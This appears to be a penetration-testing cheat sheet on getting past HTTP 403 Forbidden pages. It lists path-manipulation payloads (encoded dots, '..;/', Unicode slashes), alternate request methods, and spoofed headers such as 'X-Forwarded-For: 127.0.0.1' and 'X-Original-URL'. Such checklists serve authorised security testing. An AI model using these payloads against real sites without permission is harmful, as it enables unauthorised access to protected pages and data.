<h1> Bypassing 403 Responses </h1> <br>
<b> Install 403 bypass onto Burpsuite from the extender tool, this then becomes an extension you can run on 403 pages on Burpsuite </b></p> <br>

<h2> Directory Brute Forcing </h2><br>
Bruteforce the URL path on the 403 directory. Use different wordlists and experiment to see if you can access further pages after the 403 directory <br>
/access/user - 403    /access/user/properties.json  - 200 OK <br>
<br>

<h2> URL Paths </h2> <br>
Adding the following within the URL and the file that is 403'd or after the file that is 403'd<br>
admin/* <br>
admin/%2f/ <br>
admin/./ <br>
admin/ <br>
admin/*/ <br> 
admin/..;/ <br>
admin/..%3B/ <br> 
<br>
This is common on Apache Tomcat <br>

<h2> Change request methods </h2> <br>
Don't just send a get request, try POST, PATCH, PUT, GET, TRACE <br>
<br>

<h2 Add .json to the end of the file name, or brute force a .json file endpoint after the 403 file </h2>
  /api/user - 403 <br>
  /api/user/properties.json - 200 OK
<br>
  <h2> HTTP Headers </h2> <br>
  Change Host header to value of a subdomain, google.com etc <br>
  <br>
  Fuzz headers that may allow you to bypass <br>
X-Originating-IP: 127.0.0.1 <br>
X-Forwarded-For: 127.0.0.1 <br>
X-Forwarded: 127.0.0.1 <br>
Forwarded-For: 127.0.0.1 <br>
X-Remote-IP: 127.0.0.1 <br>
X-Remote-Addr: 127.0.0.1 <br>
X-ProxyUser-Ip: 127.0.0.1 <br>
X-Original-URL: 127.0.0.1 <br>
Client-IP: 127.0.0.1 <br>
True-Client-IP: 127.0.0.1 <br>
Cluster-Client-IP: 127.0.0.1 <br>
X-ProxyUser-Ip: 127.0.0.1 <br>
Host: localhost <br>
  
  <br>
  If the path is protected you can try the following headers <br>
 X-Original-URL: /path/file <br>
X-Rewrite-URL: /path/file <br> 
  Your normal request would be a request to / with the headers identifying the actual path. <br>
  <br>
  <h2> Path Fuzzing <h2> <br>
    if /admin is blocked : <br>
Try using /%2e/admin _(if the access is blocked by a proxy, this could bypass the protection). Try also_** /%252e**/admin (double URL encode) <br>
Try Unicode bypass: /%ef%bc%8fadmin (The URL encoded chars are like "/") so when it's encoded back it will be //path and maybe you will have already bypassed the /path name check <br>
    <br>
site.com/secret –> HTTP 403 Forbidden <br>
site.com/SECRET –> HTTP 200 OK <br>
site.com/secret/ –> HTTP 200 OK <br>
site.com/secret/. –> HTTP 200 OK <br>
site.com//secret// –> HTTP 200 OK <br>
site.com/./secret/.. –> HTTP 200 OK <br>
site.com/;/secret –> HTTP 200 OK <br>
site.com/.;/secret –> HTTP 200 OK <br>
site.com//;//secret –> HTTP 200 OK <br>
site.com/secret.json –> HTTP 200 OK (ruby) <br> 
<br>
 For unicoding, if you are trying to access /admin -403, try adding all the unicode characters in this list within the path https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Unicode.txt <br>
The request would be /FUZZadmin - /FUZZ/admin - /adminFUZZ
